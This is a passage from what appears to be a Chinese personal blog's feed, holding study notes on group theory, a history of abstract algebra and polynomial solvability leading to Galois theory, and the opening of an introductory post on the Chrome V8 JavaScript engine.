a∈Z\}\\定义这个实数集合里的运算是乘法，于是有\\~~~~~~~~~~~~~~~~~~~f(a·b)=f(a)\odot(b)\\~~~~~~~~~~~~~~~~即f(a+b)=f(a)·(b)\\~~~~~~~~~~~~~~~~即e^{a+b}=e^a·e^b\end{array}</script></blockquote><ul><li><strong>例2：对于高中导数题中，会有碰到指对同构类型的题目</strong></li></ul><p>&gt;<br>&gt;<br>&gt;</p><h1 id="变换群与置换群"><a href="#变换群与置换群" class="headerlink" title="变换群与置换群"></a>变换群与置换群</h1><h2 id="变换群"><a href="#变换群" class="headerlink" title="变换群"></a>变换群</h2><ul><li>在介绍变换群之前，我们先要介绍映射关系的乘法运算，从而直接引出变换群。</li></ul><blockquote><p><strong>映射关系的乘法运算</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}规定集合A上的两个变换f和g的乘法如下:\\对于任意a∈R有fg(a)=f(g(a))\end{array}</script><p><strong>注意</strong>：这时变换关系（映射关系）的乘法运算，之后变换群中映射的乘法运算也就是该运算。</p><p><strong>变换群定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}一个集合A的若干变换如果对于变换的乘法构成群,则称为变换群。\end{array}</script><p><strong>注意</strong>：定义中构成群的是变换关系（映射关系）即f、g这种映射构成的集合满足群的定义而不是某个集合元素经过某个变换关系所构成的集合构成群。所以乘法构成群，群中的元素是<strong>f、g、h、恒等变换</strong>这些映射关系。</p><p><strong>强调：</strong>变换群中的单位元是<strong>恒等变化</strong>这一映射关系 </p><p><strong>定理1</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}集合A上所有一一变换能构成群,该群被称为最大变换群G\end{array}</script><p><strong>定理5</strong>：凯莱定理（cayley定理）</p><script type="math/tex; mode=display">\begin{array}{l}任何一个群都同构于一个变换群\end{array}</script></blockquote><ul><li>这里给一个例题： </li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101222350884.png" alt="image-20250101222350884"></p><h2 id="置换群"><a href="#置换群" class="headerlink" title="置换群"></a>置换群</h2><ul><li>理解每个群，要理解群中的元素到底指的是什么。要不然确实挺懵的。就像我理解变换群一样，刚开始并不知道变换群将的是对应关系。</li><li>接下来是置换群，置换群是比较直观，但确实一个分水岭。</li></ul><p>&gt;<br>&gt;</p><blockquote><p><strong>置换群的定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}有限集上的一一变换叫做置换。同一集合上的若干置换构成的群称为置换群。\\包含n个元素的集合上的全体置换作成群的群，称为n次对称群，记为S_n\end{array}</script><p><strong>注意1</strong>：置换群中的元素也和变换群一样，是<strong>有限集上一一变换</strong>构成的集合。该集合满足群的条件后，就被称为置换群。所以该群的元素还是像f、g这类的变换法则。</p><p><strong>注意2</strong>：置换群是变换群中的一种，所以可以类比变换群去学习置换群</p><p><strong>强调</strong>：可以类比一下变换群中的最大变换群，去记忆对称群</p><p><strong>定理1</strong>：有限群的凯莱定理</p><script type="math/tex; mode=display">\begin{array}{l}任何一个有限群都同构于一个置换群\end{array}</script><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101232210607.png" alt="image-20250101232210607"></p><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101232403637.png" alt="image-20250101232403637"></p></blockquote><h3 id="置换的乘法"><a href="#置换的乘法" class="headerlink" title="置换的乘法"></a>置换的乘法</h3><ul><li>这里了解完置换的定义和循环置换、对换后再来理解置换的乘法。这里讲完对换乘法之后就可以直接来到对称群</li></ul><h3 id="对称群"><a href="#对称群" class="headerlink" title="对称群"></a>对称群</h3><ul><li>从上面的置换群定义中，得到了对称群的定义。从而再引出一些列概念，比如<strong>循环置换</strong></li></ul><blockquote><p><strong>对称群的定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}包含n个元素的集合上的全体置换作成群的群，称为n次对称群，记为S_n\end{array}</script><p><strong>定理2</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}n次对称群S_n的阶是n!,即\mid S_n \mid=n!\end{array}</script><p><strong>定理3</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}置换可以表示为若干个不相交循环置换的乘积\end{array}</script><p><strong>定理4</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}任何一个循环置换都可以表示为若干个对换的乘积\end{array}</script><p><strong>定理4注解</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}定理4还可以更准确地说为：\\k-循环可以表示为至少(k-1)个对换的乘积\\或者(r_1r_2···r_{k-1}r_k)=(r_1r_k)·(r_1r_{k-1})·····(r_1r_2)\end{array}</script><p><strong>推论</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}任何一个置换都可以表示为若干个对换的乘积\end{array}</script></blockquote><h3 id="奇置换和偶置换"><a href="#奇置换和偶置换" class="headerlink" title="奇置换和偶置换"></a>奇置换和偶置换</h3><ul><li>由任何一个置换都可以由若干个对换表示，我们引出了奇置换和偶置换。</li></ul><blockquote><p><strong>奇偶置换定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}在S_n中,能够表示为奇数多个对换乘积的置换称为奇置换\\能够表示为偶数多个对换乘积的置换称为偶置换\\所有偶置换的集合记为A_n\end{array}</script><p>注意：这里的所有偶置换构成的集合比较特殊和重要。该集合关于变换的乘法也能构成一个群，该群有个名称叫做交错群。</p><p><strong>交错群的定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}n元偶置换全体组成的集合为A_n\\A_n对乘法构成一个群，该群称为交错群,其阶为\\\mid A_n\mid=\frac{n!}{2}\end{array}</script><p><strong>定理5</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}当n≥2时,S_n中奇置换和偶置换各占一半,即\mid A_n \mid=\frac{n!}{2}\end{array}</script></blockquote><h1 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h1><ul><li>这里将介绍其他群的概念，循环群、生成元、元素的阶</li><li>循环群学过了都说是群中最简单的一类群，在学习循环群时要先来理解一下欧拉函数。</li></ul><h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><blockquote><p><strong>欧拉函数</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}欧拉函数\phi(n)定义为：小于n且与n互素的非负整数个数\end{array}</script></blockquote><ul><li>两个例题练练手：</li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101214344139.png" alt="image-20250101214344139"></p><h2 id="循环群"><a href="#循环群-1" class="headerlink" title="循环群"></a>循环群</h2><ul><li>循环群的定义还是比较好理解的</li></ul><blockquote><p><strong>循环群定义</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}如果一个群G里的元素都是某一个元素g的幂\\则G称为循环群，g称为G的一个生成元。由g生成的循环群记为(g)即G=(g)。\end{array}</script><p><strong>无限循环群可表示为</strong>：</p><script type="math/tex; mode=display">\{···,g^{-2},g^{-1},g^0,g^1,g^2,···\}\\其中g^0=e</script><p><strong>有限n阶循环群可表示为</strong>：</p><script type="math/tex; mode=display">\{g^0,g^1,g^2,···,g^{n-1}\}\\其中g^0=e</script></blockquote><h2 id="交错群"><a href="#交错群" class="headerlink" title="交错群"></a>交错群</h2><h1 id="剩余类群"><a href="#剩余类群" class="headerlink" title="剩余类群"></a>剩余类群</h1><ul><li>同余、剩余类、剩余类群</li></ul><h1 id="子群"><a href="#子群" class="headerlink" title="子群"></a>子群</h1><ul><li>接下来介绍一下子群，来进一步了解一下群的性质。</li></ul><h2 id="子群的概念"><a href="#子群的概念" class="headerlink" title="子群的概念"></a>子群的概念</h2><ul><li>在群中定义了一些群中子集的运算，这里介绍一下。</li></ul><blockquote><p>设G是一个群，A，B是G的非空子1集，g是G的一个元素，我们规定群中子集的运算如下：</p><script type="math/tex; mode=display">\begin{array}{l}AB=\{ab|a∈A,b∈B\},\\A^{-1}=\{a^{-1}\mid a∈A\},\\gA=\{ga\mid a∈A\}。\\这里要注意一点就是，AA^{-1}并不等于\{e\},根据第二个公式，AA^{-1}=\{a_1a_2^{-1}\mid a_1,a_2∈A\}\end{array}</script></blockquote><ul><li>从群中子集的运算我们引出了子群的概念。</li></ul><blockquote><p><strong>子群</strong>：一个子集内的元素也可以满足群的条件而成为一个群，这就是子群的概念。</p><script type="math/tex; mode=display">\begin{array}{l}定义：一个群G的一个子集H如果对于G的乘法构成一个群，则称为G的子群。\\注意：\\对于任意一个群G至少有两个子群:①G本身;②只包含单位元的子集\{e\}\\它们称为G的平凡子群,其他群称为真子群。\end{array}</script></blockquote><h1 id="陪集"><a href="#陪集" class="headerlink" title="陪集"></a>陪集</h1><ul><li>集合的运算、陪集、拉格朗日定理、子群在群中的指数、</li></ul><h2 id="前置知识"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>在了解陪集之前先要了解一下集合与元素的乘法运算以及集合与集合的乘法运算。</li></ul><blockquote><p><strong>集合与元素的乘法运算</strong></p><p>集合A与元素b的乘法运算的结果得到一个新<strong>集合B</strong>，该集合中的元素就是<strong>集合A中的每个元素与元素b的乘积</strong>。</p><p>符号表达为：</p><script type="math/tex; mode=display">B = bA = \{ bh \mid h \in A \}</script><p><strong>集合与集合的乘法运算</strong></p><p>集合A与集合B的乘法运算的结果得到的仍是一个新<strong>集合C</strong>，该集合中的元素就是<strong>集合A中的每个元素与集合B中的每个元素的乘积</strong></p><p>符号表达为：</p><script type="math/tex; mode=display">C = AB =\left \{ab|a∈A,b∈B\right \}</script></blockquote><ul><li>知道集合与元素的乘法运算之后，这边介绍该运算中在群中的两个性质。</li></ul><blockquote><p><strong>性质一</strong>：</p><p>设G是一个群。</p><script type="math/tex; mode=display">aG = \left\{ ah \mid h \in G \right\} = G</script><p>证明思路就去证明:</p><script type="math/tex; mode=display">aG\subseteq G和G\subseteq aG</script><p><strong>性质二</strong>：</p><p>设G是一个群。</p><script type="math/tex; mode=display">GG=\left \{ah|h∈G，a∈G\right \}=G</script></blockquote><h2 id="陪集的定义"><a href="#陪集的定义" class="headerlink" title="陪集的定义"></a>陪集的定义</h2><ul><li>了解了前置知识后再来了解陪集的定义。</li></ul><blockquote><p><strong>陪集的定义</strong>：</p><p><strong>左陪集</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}设H是群G的一个子群。对于任意a∈G，集合\\aH=\{ah\mid h∈H\}\\称为H的一个左陪集，记为aH。\end{array}</script><p><strong>右陪集</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}设H是群G的一个子群。对于任意a∈G，集合\\Ha=\{ha\mid h∈H\}\\称为H的一个右陪集，记为Ha。\end{array}</script><p><strong>注意</strong>：对于交换群(即阿贝尔群)，左陪集和右陪集是一致的，可以称为陪集。</p><p><strong>特别地1</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}当a∈H时有：aH=H,则H也是自己的一个左陪集。\\同理H也是自己的右陪集。\end{array}</script><p><strong>特别地2</strong>：</p><script type="math/tex; mode=display">\begin{array}{l}左右陪集都可由aH中的任意一个元素唯一确定。\\假设:b∈aH,即b=ah(h∈H)\\即：bH=ahH=a(hH)=aH。\\右陪集也同理可证。\end{array}</script></blockquote><h1 id="正规子群和商群"><a href="#正规子群和商群" class="headerlink" title="正规子群和商群"></a>正规子群和商群</h1>]]></content>
    
    
    <summary type="html">太抽象了</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="抽象代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>抽象代数-前言</title>
    <link href="http://iyheart.github.io/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/"/>
    <id>http://iyheart.github.io/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/</id>
    <published>2025-10-16T09:13:54.000Z</published>
    <updated>2025-10-17T07:01:38.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017145845958.png" alt="image-20251017145845958"></p><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017145915237.png" alt="image-20251017145915237"></p><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017150120286.png" alt="image-20251017150120286"></p><h1 id="关于抽象代数"><a href="#关于抽象代数" class="headerlink" title="关于抽象代数"></a>关于抽象代数</h1><ul><li><p>抽象代数算是距离现在年代比较近产生的数学理论，并且在数学和计算机以及密码学这块是非常重要的。所以学好抽象代数很重要。</p></li><li><p>学习抽象代数，其最核心的定理是<strong>Galois大定理</strong>：一个特征为0的域F上的n次方程在F上根式可解当前仅当它在F上的Galois群是可解群。</p></li><li>从核心定理其实就可以知道抽象代数围绕的问题是<strong>n次方程根式可解</strong>这一问题。</li><li>学习抽象代数的很多内容其实都是在为<strong>Galois</strong>大定理的理解和证明做铺垫，在理解<strong>Galois</strong>大定理的时候就需要理解如下的知识，并且在证明它的时候需要用到很多定理，这些知识和定理其实就占了抽象代数的一大半：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对于理解该大定理首先要理解：域、域的特征、Galois群、可解群、根式可解。而需要理解这些还需要一定的前置知识</span><br><span class="line">域 </span><br><span class="line">域的特征</span><br><span class="line">Galois群--&gt; 群 --&gt; 自同构</span><br><span class="line">可解群--&gt; 正规子群 </span><br><span class="line">根式可解--&gt; 根式扩张 --&gt; 域扩张</span><br></pre></td></tr></table></figure><h1 id="抽象代数极简史"><a href="#抽象代数极简史" class="headerlink" title="抽象代数极简史"></a>抽象代数极简史</h1><ul><li>前期：<code>1760</code>年之前<ul><li>小于等于四次方程的解法，从<code>2、3、4</code>次方程都有求根公式，这样就产生了一个问题，5次及以上的方程是否也有求根公式</li><li>根于系数的关系，韦达定理，一般方程的根与系数关系是有<code>Girard</code>证明</li><li>利莫佛公式与n次单位根</li><li>代数学基本定理，<code>Girard</code>证明了根的存在定理。即：复数域上任何一个非0次多项式，一定有根并且根都在复数域中，并且在数重数的意义下根的个数与次数相同。</li></ul></li><li>中期：<code>1760</code>~<code>1798</code>年之间<ul><li><code>Bézout</code>：用n次单位根表示n次方程的根</li><li><code>Lagnage(拉格朗日)</code>：考察了小于等于4的各种解法，总结了这些解法的特点；考察这些解法为什么会产生根，从而提出了造根原理。</li><li><code>Vander monde(范德蒙)</code>：把根表示成根的对称表达式$x_{1,2}=\frac{1}{2}[(x_1+x_2)\pm\sqrt{(x_1+x_2)^2-4x_1x_2}]$，对根的置换也进行了大量的计算，根重要的是范德蒙求出了11次单位根的根式表达式。</li><li><code>Gauss(高斯)</code>：建立了分圆理论，证明了一般的n次单位根的根式表示</li></ul></li><li>后期：<code>1799</code>~<code>1829</code>年<ul><li><code>Ruffini</code>：<strong>第一次证明</strong>了大于等于5次一般方程没有求根公式，但是该证明存在漏洞，并且该证明有500多页。</li><li><code>Abel(阿贝尔)</code>：独立与<code>Ruffini</code>第一个完整证明大于等于5次的一般方程没有求根公式(1824年)；</li><li><code>Abel</code>：当特征为0的域F上的多项式是Galois群是交换群时这个方程一定可以根式解。</li></ul></li><li>产生：<code>1830~1832</code>年<ul><li><code>Galois</code>：提出了<code>Galois</code>大定理。</li></ul></li></ul><h1 id="抽象代数简史"><a href="#抽象代数简史" class="headerlink" title="抽象代数简史"></a>抽象代数简史</h1><ul><li>抽象代数的简史分为前期、中期、后期以及产生。先来了解一下抽象代数的历史会更有助于理解和学习抽象代数。</li></ul><h2 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h2><h3 id="求根公式"><a href="#求根公式" class="headerlink" title="求根公式"></a>求根公式</h3><p>小于等于4次方程的原始解法。</p><ul><li>一次$ax+b=0,a≠0$，除首项系数：$x+\frac{b}{a}=0$，移项得到：$x=-\frac{b}{a}$</li><li>二次$ax^2+bx+c=0,a≠0$：<ul><li>除首项系数：$x^{2}+\frac{b}{a}x+\frac{c}{a}=0$</li><li>配方：$(x+\frac{b}{2a})^2-\frac{b^2}{4a^2}+\frac{c}{a}=0$</li><li>移项：$(x+\frac{b}{2a})^2=\frac{b^2-4ac}{4a^2}$</li><li>开方：$x+\frac{b}{2a}=\pm\frac{\sqrt{b^2-4ac}}{2a}$</li></ul></li><li><p>三次$ax^3+bx^2+cx+d=0,a≠0$，<code>Girard</code>等解法：</p><ul><li>同样是除首项系数，那其实就直接设<code>a=1</code>，即方程$x^3+bx^2+cx+d=0$</li><li>变换$x=y-\frac{b}{3}$：带入可以消二次项系数，即$y^3+py+q=0$</li><li>增加变量令<code>y=u+v</code>代入：$u^3+v^3+3uv(u+v)+p(u+v)+q=0$部分因式分解可得$u^3+v^3+(u+v)(3uv+p)+q=0$</li><li>令$3uv+p=0$，从而化简方程：$u^3+v^3+q=0$，这样利用$3uv+p=0$可以解出$v=-\frac{p}{3u}$，带入方程可以得到$u^3+(-\frac{p}{3u})^3+q=0$，化简得$u^6+qu^3-(\frac{p}{3})^3=0$是关于$u^3$的一个二次方程</li><li>利用求根公式可以得到$u^3=-\frac{q}{2}\pm\sqrt{(\frac{q}{2})^2+(\frac{p}{3})^3}$</li><li>从而可以得到$x=u+v-\frac{b}{3},(a=1)$</li></ul></li><li><p>四次方程，Ferrari解法$x^4+ax^3+bx^2+cx+d=0$</p><ul><li>用变换$x=y-\frac{a}{4}$消三次项系数得到$y^4+py^2+qy+r=0$</li><li>配方：$(y^2+\frac{p}{2})^2=\frac{p^2}{4}-qy-r$</li><li>增加变量，在配方左边的式子增加变量：$(y^2+\frac{p}{2}+u)=\frac{p^2}{4}-qy-r+u^2+2uy^2+pu$</li><li>增加了变量，有了自由度，选取一个u将右边凑平方，右边通过将<code>y</code>作为主元，得到y的二次方程令$\Delta=q^2-8u(\frac{p^2}{4}-r+u^2+pu)=0$得到关于<code>u</code>的3次方程，由于三次方程已经有求根公式，这样可以根式解出u</li><li>从而第三步所得方程就可以变成$(y^2+\frac{p}{2}+u)^2=2u(y^2-\frac{q}{2u}y+(\frac{q}{4u})^2)$，从而可以得到$y^2+\frac{p}{2}+u=\pm\sqrt{2u}(y-\frac{q}{4u})$</li><li>转化为关于y的的二次方程，可以根式解出y</li></ul></li></ul><p>小于等于4次方程的其他解法（都考虑首项系数为1）</p><ul><li><p><code>Viete(韦达)</code>的三次方程解法：$x^3+px+q=0$：</p><ul><li>令$x=\frac{p}{3y}-y$，带入可以得到$y^6-qy^3-(\frac{p}{3})^3=0$</li><li>解出$y^3=\frac{q}{2}\pm\sqrt{(\frac{q}{2})^2+(\frac{p}{3})^3}$</li></ul></li><li><p><code>Descarte(笛卡尔)</code>的四次方程解法：$x^4+px^2+qx+r=0$</p><ul><li>分解：$x^4+px^2+qx+r=(x^2+kx+u)(x^2-kx+v)$</li><li>这样直接乘开得到$x^4+px^2+qx+r=x^4+(u+v-k^2)x^2+k(u-v)x+uv=0$</li><li>这样直接用待定系数法：$p=u+v-k^2$，$q=k(u-v)$，$r=uv$，联立解得$u=\frac{1}{2}(k^2+p-\frac{q}{k})$，$v=\frac{1}{2}(k^2+p+\frac{q}{k})$</li></ul></li><li><p><code>Tschirnhaus(契恩豪斯解法)</code>解一般的n次方程：$x^n+a_{n-1}x^{n-1}+…+a_1x+a_0=0$</p><ul><li>令$y=x^{n-1}+b<em>nx^{n-2}+…+b_1x+b_0$，这样就可以消掉x得到关于y的一个n次方程：$y^n+c</em>{n-1}y^{n-1}+…+c_1y+c_0=0$</li><li>取非常好的$b<em>i$使得$c</em>{n-1}=…=c_1=0$，从而$y^n+c_0=0$于是$y=-\sqrt[n]{c_0}$，契恩豪斯断言其解法对一般的n成立，其只测试了<code>n=3</code></li><li>事实上<code>n-1</code>个方程能决定<code>n-1</code>个变量，但由<code>Bézout</code>的消去理论，一般要解一个<code>(n-1)!</code>次的方程</li></ul></li></ul><h3 id="棣莫弗公式"><a href="#棣莫弗公式" class="headerlink" title="棣莫弗公式"></a>棣莫弗公式</h3><ul><li><p><code>e Moivre</code>公式与<code>n</code>次单位根：$(cos\theta+isin\theta)^n=cos(n\theta)+isin(n\theta)$，即欧拉公式$(e^{i\theta})^n=e^{i(n\theta)}$</p></li><li><p>利用棣莫弗公式就可以解方程：$z^n=1=cos\theta+isin\theta$，可以得到$\theta=\frac{2k\pi}{n},\omega_k=cos(\frac{2k}{n})+isin(\frac{2k\pi}{n}),k=0,1,…n-1$，这里称$z^n-1=0$的解为n次单位根</p></li><li><p>n次单位根的根式表示：使用棣莫弗公式就可以将n次单位根的根式表示化为n是素数时，$z^n-1=\Pi^{n-1}_{k=0}(z-w_k)$</p></li><li><p>根与系数的关系，并且衍生出对称多项式：</p><ul><li><code>Viete(韦达)</code>：强调方程的结构即根与系数的关系，并且证明了二次、三次方程的根与系数的关系</li><li><code>Girard(吉拉德)</code>：证明了n次方程的根与系数的关系$z^n+a<em>1z^{n-1}+…+a</em>{n-1}z+a_0=0$的n个根满足</li></ul><script type="math/tex; mode=display">s1 = x_1+x_2+...+x_n=-a_1\\s2 = x_1x_2+x_1x_3+...+x_{n-1}x_n=a_2\\....\\s_n = x_1x_2...x_n = (-1)^{n}a_n</script><ul><li><code>Girard</code>开始研究对称多项式，三元对称多项式$x^2_1+x^2_2+x^2_3$，之后又有<code>牛顿等人</code>，设$s1、s_2、…、s_n$的为$x_1、x_2、…、x_n$的初等对称多项式</li><li><code>Vander monde(范德蒙)</code>证明了对称多项式定理，一个域F上关于n个不定元$x_1、x_2、….、x_n$的多项式<code>f</code>可以表示成$s_1、s_2、….、s_n$的多项式当前仅当<code>f</code>关于$x_1、x_2、…、x_n$的置换不变。即$f(x_1,x_2,x_3)=f(x_2,x_1,x_3)$</li></ul></li></ul><h3 id="代数学基本定理"><a href="#代数学基本定理" class="headerlink" title="代数学基本定理"></a>代数学基本定理</h3><ul><li><p><code>Girard</code>根的存在定理：域F上的一个n次多项式<code>(n≥1)</code>的多项式<code>p(x)</code>在F的某个扩域K上可以分解成$p(x)=a(x-a_1)…(x-a_n),a,a_1,…a_n\in K$</p></li><li><p>代数学基本定理：复数域<code>C</code>是代数封闭的，即C上的任何非0多项式的根均在C中，而且在计重数的意义下方程的根的个数等于方程的次数。</p><ul><li>该定理的第一个证明是由<code>d&#39;Alembert</code>给出的，但是他没有证明根的个数等于方程的次数，第一个完整的证明是<code>Gaauss</code>给出的</li><li>欧拉尝试代数的证明，而<code>Fonceneux</code>进行改进，最后拉格朗日给出第一个严格的证明</li></ul></li></ul><h2 id="中期"><a href="#中期" class="headerlink" title="中期"></a>中期</h2><p>四个具有代表性的人的工作。</p><h3 id="bezout"><a href="#Bezout" class="headerlink" title="Bezout"></a>Bezout</h3><ul><li><p><code>Bezout</code>用n次单位根表几次方程的根。</p><ul><li><p>消去方程的中间变量<code>y</code>，可以得到关于<code>x</code>的一个<code>n</code>次方程$R<em>n(x)=0$，且$R_n(x)$的系数可以用$a_0,….,a</em>{n-1}$表示出来。：</p><script type="math/tex; mode=display">\begin{equation}\begin{cases}x = a_0 + a_1y + ... +a_{n-1}y^{n-1} \\y^n = 1\end{cases}\end{equation}</script></li><li><p>$R<em>n(x)=0$的根，当$y=\omega_k$是一个<code>n</code>次单位根时，有$w_k=e^{\frac{2k\pi i}{n}}$，能找到$x_k = a_0+a_1w_k+…+a</em>{n-1}w<em>k^{n-1}$是$R_n(x)=0$的根。得到$R_n(x)=\Pi^{n-1}</em>{k=0}(x-x_k)$</p></li><li>解n次方程$P(x)=0$：找合适的$a<em>0,a_1,…,a</em>{n-1}$，使得$R<em>n(x)=P(x)$，从而$P(x)$的根为$x_1,…,x_n$，其中$x_n=a_0+a_1\omega_k+..+a</em>{n-1}\omega_k^{n-1}$</li><li>注意：<code>Bezout</code>只证明了<code>n=2,3,4</code>的情况</li></ul></li></ul><h3 id="lagrange"><a href="#Lagrange" class="headerlink" title="Lagrange"></a>Lagrange</h3><ul><li><p><code>Lagrange</code>划时代的工作：</p><ol><li><p>回顾总结了前面$n≤4$次方程的解法。共同点：通过一个巧妙的变换化为一个地刺的辅助方程</p></li><li><p>探求这些解法产生根的机制，本质上要把辅助方程的根表为原方程的根的有理函数，还发现了造根原理，相对的造根原理。</p></li><li><p>提出了<code>Lagrange</code>预解式。</p></li></ol></li><li><p><code>Lagrange</code>的深思：</p><ol><li>在造根原理的促进下，发现了群论和<code>Galois</code>理论的早期结果。</li><li>研究<code>Lagrange</code>预解式的性质并设计了用来根式解方程的方案。</li><li>一般的<code>n≥5</code>次方程可能没有求根公式。</li></ol></li></ul><h3 id="vander-monde"><a href="#Vander-monde" class="headerlink" title="Vander monde"></a>Vander monde</h3><ul><li><p>把根用根的对称函数表示比如：二次方程：$x_{1,2}=\frac{1}{2}[(x+n)\pm\sqrt(x_1+x_2)^{2}-4x_1x_2]$</p></li><li><p>设计方案如下：</p><ul><li>找到一个根的函数是我们一般意义上的根。（已经证明了）</li><li>根的函数关于根的置换是对称的。（只证明了<code>n=2,3,4</code>）</li><li>带入根的和，以及两两乘积的和（方程的系数）根的函数就是方程的根。</li></ul></li><li>对根的置换进行了大量的计算。</li><li>提出了<code>Vander monde</code>预解式。</li><li>11次单位根用根式表示</li><li>为了解一个方程的结构，只需考察那些保持根的关系的置换</li></ul><h3 id="gauss"><a href="#Gauss" class="headerlink" title="Gauss"></a>Gauss</h3><p>Gauss主要是分圆理论。</p><ul><li><code>n</code>次单位根的根式表示：在<code>Vander monde</code>的基础上引入了循环置换，以及根之间的关系</li><li>正<code>n</code>边形的尺规作图问题：正<code>n</code>边形可以用尺规作出来当且仅当<code>n</code>的素因子只能是<code>2</code>或者<code>Fermat</code>素数。注：形为$2^m+1$数如果是素数，那么则称该素数为<code>Fermat</code>素数。</li><li>高斯的这一套理论适用预其他的超越函数类。</li></ul><h2 id="后期与产生"><a href="#后期与产生" class="headerlink" title="后期与产生"></a>后期与产生</h2>]]></content>
    
    
    <summary type="html">前言：抽代学的不好，重新学习抽象代数</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="抽象代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome v8学习1</title>
    <link href="http://iyheart.github.io/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/"/>
    <id>http://iyheart.github.io/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/</id>
    <published>2025-10-12T16:20:52.000Z</published>
    <updated>2025-10-19T11:59:28.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资料收集"><a href="#资料收集" class="headerlink" title="资料收集"></a>资料收集</h1><ul><li>参考博客：<a href="https://www.cnblogs.com/ai888/p/18607673">请说下V8、chrome、chromium三者之间的关系 - 王铁柱6 - 博客园</a></li><li>参考文章：<a href="https://zh.wikipedia.org/wiki/即時編譯">即时编译 - 维基百科，自由的百科全书</a></li><li>参考课件：<a href="https://github.com/plctlab/v8-internals">plctlab/v8-internals: 面向编译器开发人员的V8内部实现文档</a></li><li>V8github仓库链接：<a href="https://github.com/v8/v8">v8/v8: The official mirror of the V8 Git repository</a></li></ul><h1 id="初步了解"><a href="#初步了解" class="headerlink" title="初步了解"></a>初步了解</h1><p><code>chrome v8</code>是Google开发的开源高性能<code>JavaScript</code>和<code>WebAssembly</code>引擎，使用<code>C++</code>编写。</p><ul><li><code>V8</code>负责执行<code>JavaScript</code>代码，管理内存，以及进行垃圾回收。</li><li><code>V8</code>引擎通过即时编译技术<code>JIT</code>技术优化代码执行效率，先将<code>JavaScript</code>源码转换为抽象语法树<code>(AST)</code>，再转换为字节码，最终编译成优化的机器码执行。</li><li><code>V8</code>可以独立运行，也可以<strong>嵌入到任何C++应用程序中</strong>，最著名的应用方案就是<code>Node.js</code></li></ul><h2 id="chrome-v8发展"><a href="#chrome-v8发展" class="headerlink" title="chrome v8发展"></a>chrome 